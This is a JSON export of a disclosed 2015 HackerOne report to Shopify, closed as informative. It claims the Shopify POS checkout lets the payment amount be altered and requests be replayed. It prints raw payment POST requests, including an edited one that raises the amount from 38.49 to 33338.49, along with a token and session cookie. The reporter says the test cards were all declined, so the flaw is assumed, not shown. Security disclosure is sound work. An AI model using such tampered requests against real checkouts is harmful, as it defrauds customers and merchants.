{
  "id": 56800,
  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC81NjgwMA==",
  "url": "https://hackerone.com/reports/56800",
  "title": "Multiple issues on Checkout Process",
  "state": "Closed",
  "substate": "informative",
  "severity_rating": "none",
  "readable_substate": "Informative",
  "created_at": "2015-04-16T22:10:30.829Z",
  "submitted_at": "2015-04-16T22:10:30.829Z",
  "is_member_of_team?": false,
  "is_organization_group_member?": false,
  "reporter": {
    "disabled": false,
    "username": "ishikawa",
    "url": "/ishikawa",
    "profile_picture_urls": {
      "small": "https://profile-photos.hackerone-user-content.com/variants/000/019/797/dbf342ccb9d760e540ad2831da2dcf44a3f6bf2a_original.jpg/3c7b305354c9073c106ae3d1701798defaaf5be844fb8fdfa49ca62f991a2c2c"
    },
    "is_me?": false,
    "cleared": false,
    "verified": false,
    "hackerone_triager": false,
    "hacker_mediation": false
  },
  "team": {
    "id": 1382,
    "url": "https://hackerone.com/shopify",
    "handle": "shopify",
    "profile_picture_urls": {
      "small": "https://profile-photos.hackerone-user-content.com/variants/fjjiC5585s8WoDGHv2M5okbJ/3c7b305354c9073c106ae3d1701798defaaf5be844fb8fdfa49ca62f991a2c2c",
      "medium": "https://profile-photos.hackerone-user-content.com/variants/fjjiC5585s8WoDGHv2M5okbJ/f4a495c04fdb224bac8ec64587537e511aa8c4925e7955bee0a19e0ed7d891dc"
    },
    "permissions": [],
    "submission_state": "open",
    "default_currency": "usd",
    "awards_miles": false,
    "offers_bounties": true,
    "state": "public_mode",
    "only_cleared_hackers": false,
    "pentest_feature_enabled?": false,
    "profile": {
      "name": "Shopify",
      "twitter_handle": "",
      "website": "https://www.shopify.com",
      "about": "Shopify is a multi-channel commerce platform that helps people sell online, in-store, and everywhere in between."
    }
  },
  "has_bounty?": false,
  "in_validation?": false,
  "can_view_team": true,
  "can_view_report": true,
  "is_external_bug": false,
  "is_published": false,
  "is_participant": false,
  "has_collaborators": false,
  "submitted_by_team_member": false,
  "stage": 4,
  "public": true,
  "visibility": "full",
  "cve_ids": [],
  "singular_disclosure_disabled": true,
  "disclosed_at": "2015-05-21T16:10:17.782Z",
  "bug_reporter_agreed_on_going_public_at": "2015-04-21T16:10:01.418Z",
  "team_member_agreed_on_going_public_at": null,
  "comments_closed?": false,
  "facebook_team?": false,
  "team_private?": false,
  "vulnerability_information": "#### Description\r\nWhile reviewing the Shopify POS application we found that the application was encrypting the CHD information, but it was leaving the amount outside of the payload and the post lacked any sort of HMAC signature preventing replay attacks.  In addition, given the application does not enforce SSL Pinning a malicious seller could easily install a certificate to force messages through a proxy in which the attacker could alter content. \r\n\r\n**Disclosure: We used the cards provided on https://docs.shopify.com/manual/more/shopify-payments/testing-shopify-payments but all of them returned as rejected.  Because of this we are assuming that given both messages were declined both altered or unaltered the application is vulnerable. **\r\n\r\nISSUE 1) \r\n1) An attacker could potentially edit on the fly the amount and trick clients into being charged more than they agreed to on the screen. \r\n\r\n```\r\nPOST /admin/checkouts/478724673/payments.json HTTP/1.1\r\nHost: matias31.myshopify.com\r\nAccept: application/json\r\nProxy-Connection: keep-alive\r\nAccept-Language: en;q=1\r\nAccept-Encoding: gzip, deflate\r\nContent-Type: application/json; charset=utf-8\r\nContent-Length: 1239\r\nX-Shopify-Access-Token: a75123bf22a67c69bcc2b0398c6ded6a\r\nConnection: keep-alive\r\nUser-Agent: Shopify POS/35 (iPhone; iOS 8.1; Scale/2.00)\r\nX-ClientRequestGroupID: 604A1AC2-852F-4300-B15D-36E0936CC605\r\nCookie: _secure_admin_session_id=eba644210071f25ddab934caaa173135; request_method=GET\r\n\r\n{\"ignore_inventory_policy\":true,\"checkout_payment\":{\"amount\":38.49,\"credit_card\":{\"ciphertext\":\"N3DXsjp3J3gN817VTQE1UvVzCflCX+RDS05h7BHbdhNzc0ydr6lWhANmORXeM6xsG9154fKIm293uKZMW1vVYuiCb7CYsi\\/Qx597bU1wp2zjZnKCBbLnRmgQQ656rGSb\",\"iv\":\"uTir8XddCSvHoOee7r7VZg==\",\"key\":\"Go0StBWztyF5idVq3ODQdzlCWFX3U8jy5yqK9uK\\/WXtDjuzOKJb6y2GPkpsJgdixsllGW2xgAOMyELqi3wSaeXcjWYF3g2lXO7WgCp+Kq5A6CCmLPBL+8ocbFB9NI3YDPjyc4K4Dan5AMormO2sszLj0EFoHYDLCUUG6SSAhDmdsHf1ZLZC1f6k71wl8VLcfhDysrdREu2fo\\/CYCR5bkxjrncm2b\\/zwetrHHvroxY76CC2bLvaBc2XrFMiiJvxgT3dZVET8Ugl3m2vi0A1UAEOIx6Y16aFH1NUZph04T2t3xi+sLakz7i+bCmtfK0nGyjiHeZudyuCk7g113nA6DemznpBDVpcBjCpQUh5rqUnHyLVIeGN3t0rMB1QeHjKLfdxIl8s2QMJI6ZxM4AokD+yVwy4fclZ0n4YBKS+eK+TJEqmvZO8DOIzqyblKUj5cZihPAZSST+HnKniEpc7ciXRHrlISEGWEOOhpsDuqUHYmmcKGxkXj+UZlX0BQkIGoRlRzNY0dDdDOSK6K5HV\\/7mslFdepkX00vtAd5kyYjCFJsSE2900ejF9EEGYDX+1Rb0vjv1qQdxZzCPQWIpt+BXfOIQCXI8o+ZIecZEI7YJdOa8VpUnb8vC+4vPsBnZmJVN1v0UZ\\/iRs0wS\\/zjsaWNSBIoiBmJBHtQpxw9utv+BXY=\",\"checksum\":\"Ate3s8OY2YD7YT5E+JWqnIcridxO0CVh55ZQKXZ+DTPEWf6T5O1IzRwbN\\/2\\/IGrjvzrT0J\\/ZLNpGjOGLe4lwhw==\"},\"point_of_sale_device_id\":809053,\"billing_address\":{\"zip\":\"98101\"},\"location_id\":454069,\"user_id\":7653165,\"gateway_action\":\"sale\",\"auto_finalize\":true,\"card_source\":\"manual\"}}\r\n```\r\n\r\nEdited\r\n```\r\nPOST /admin/checkouts/478724673/payments.json HTTP/1.1\r\nHost: matias31.myshopify.com\r\nAccept: application/json\r\nProxy-Connection: keep-alive\r\nAccept-Language: en;q=1\r\nAccept-Encoding: gzip, deflate\r\nContent-Type: application/json; charset=utf-8\r\nContent-Length: 1239\r\nX-Shopify-Access-Token: a75123bf22a67c69bcc2b0398c6ded6a\r\nConnection: keep-alive\r\nUser-Agent: Shopify POS/35 (iPhone; iOS 8.1; Scale/2.00)\r\nX-ClientRequestGroupID: 604A1AC2-852F-4300-B15D-36E0936CC605\r\nCookie: _secure_admin_session_id=eba644210071f25ddab934caaa173135; request_method=GET\r\n\r\n{\"ignore_inventory_policy\":true,\"checkout_payment\":{\"amount\":33338.49,\"credit_card\":{\"ciphertext\":\"N3DXsjp3J3gN817VTQE1UvVzCflCX+RDS05h7BHbdhNzc0ydr6lWhANmORXeM6xsG9154fKIm293uKZMW1vVYuiCb7CYsi\\/Qx597bU1wp2zjZnKCBbLnRmgQQ656rGSb\",\"iv\":\"uTir8XddCSvHoOee7r7VZg==\",\"key\":\"Go0StBWztyF5idVq3ODQdzlCWFX3U8jy5yqK9uK\\/WXtDjuzOKJb6y2GPkpsJgdixsllGW2xgAOMyELqi3wSaeXcjWYF3g2lXO7WgCp+Kq5A6CCmLPBL+8ocbFB9NI3YDPjyc4K4Dan5AMormO2sszLj0EFoHYDLCUUG6SSAhDmdsHf1ZLZC1f6k71wl8VLcfhDysrdREu2fo\\/CYCR5bkxjrncm2b\\/zwetrHHvroxY76CC2bLvaBc2XrFMiiJvxgT3dZVET8Ugl3m2vi0A1UAEOIx6Y16aFH1NUZph04T2t3xi+sLakz7i+bCmtfK0nGyjiHeZudyuCk7g113nA6DemznpBDVpcBjCpQUh5rqUnHyLVIeGN3t0rMB1QeHjKLfdxIl8s2QMJI6ZxM4AokD+yVwy4fclZ0n4YBKS+eK+TJEqmvZO8DOIzqyblKUj5cZihPAZSST+HnKniEpc7ciXRHrlISEGWEOOhpsDuqUHYmmcKGxkXj+UZlX0BQkIGoRlRzNY0dDdDOSK6K5HV\\/7mslFdepkX00vtAd5kyYjCFJsSE2900ejF9EEGYDX+1Rb0vjv1qQdxZzCPQWIpt+BXfOIQCXI8o+ZIecZEI7YJdOa8VpUnb8vC+4vPsBnZmJVN1v0UZ\\/iRs0wS\\/zjsaWNSBIoiBmJBHtQpxw9utv+BXY=\",\"checksum\":\"Ate3s8OY2YD7YT5E+JWqnIcridxO0CVh55ZQKXZ+DTPEWf6T5O1IzRwbN\\/2\\/IGrjvzrT0J\\/ZLNpGjOGLe4lwhw==\"},\"point_of_sale_device_id\":809053,\"billing_address\":{\"zip\":\"98101\"},\"location_id\":454069,\"user_id\":7653165,\"gateway_action\":\"sale\",\"auto_finalize\":true,\"card_source\":\"manual\"}}\r\n```\r\n\r\nISSUE 2) The second issue sounds like These POST messages can be replayed. The transactions seams to lack an HMAC signature which a time constrain to reduce the window of opportunity for attacks.  We tested these request from different machines, and IPs and they still get a job assigned. \r\n\r\n#### Recommendations\r\nFor issue 1) include the amount on the encrypted payload to further protect the packet and also raise the for people trying to abuse the POS application. \r\nFor issue 2) the use of an HMAC that adds the price, could also make sure the payload is not altered. \r\n\r\n",
  "weakness": {
    "id": 57,
    "name": "Violation of Secure Design Principles"
  },
  "original_report_id": null,
  "original_report_url": null,
  "attachments": [],
  "allow_singular_disclosure_at": "2015-05-21T16:10:04.642Z",
  "allow_singular_disclosure_after": -275599742.7139518,
  "singular_disclosure_allowed": true,
  "vote_count": 3,
  "voters": [
    "drsniper",
    "shazadsadiq",
    "shivammusic"
  ],
  "severity": {
    "rating": "none",
    "author_type": "Team"
  },
  "structured_scope": null,
  "abilities": {
    "assignable_team_members": [],
    "assignable_team_member_groups": []
  },
  "summaries": [
    {
      "category": "team",
      "can_view?": true,
      "can_create?": false
    },
    {
      "category": "researcher",
      "can_view?": true,
      "can_create?": false
    }
  ]
}
